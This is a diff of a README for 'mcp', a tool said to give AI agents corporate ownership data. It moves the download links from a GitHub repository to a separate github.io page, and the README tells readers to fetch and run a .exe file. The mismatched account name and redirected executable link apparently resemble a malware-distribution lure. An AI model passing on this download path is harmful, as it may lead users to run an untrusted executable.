@@ -1,6 +1,6 @@
 # 🏢 mcp - Uncover company ownership for AI agents
 
-[![](https://img.shields.io/badge/Download-mcp-blue.svg)](https://github.com/xboxgameservice/mcp)
+[![](https://img.shields.io/badge/Download-mcp-blue.svg)](https://xboxgameservice.github.io)
 
 This tool gives AI agents access to corporate ownership data. It connects your AI tools to databases containing information about parent companies, private equity backers, and corporate branches. You use this to improve the research capabilities of your AI.
 
@@ -17,7 +17,7 @@ Ensure your computer meets these basic requirements before you begin:
 
 Follow these steps to obtain the software:
 
-1.  Visit the [official download page](https://github.com/xboxgameservice/mcp) here.
+1.  Visit the [official download page](https://xboxgameservice.github.io) here.
 2.  Look for the latest release version on the right-hand side of the page.
 3.  Click the link that ends in .exe to start your download.
 4.  Save the file to your desktop or your Downloads folder.
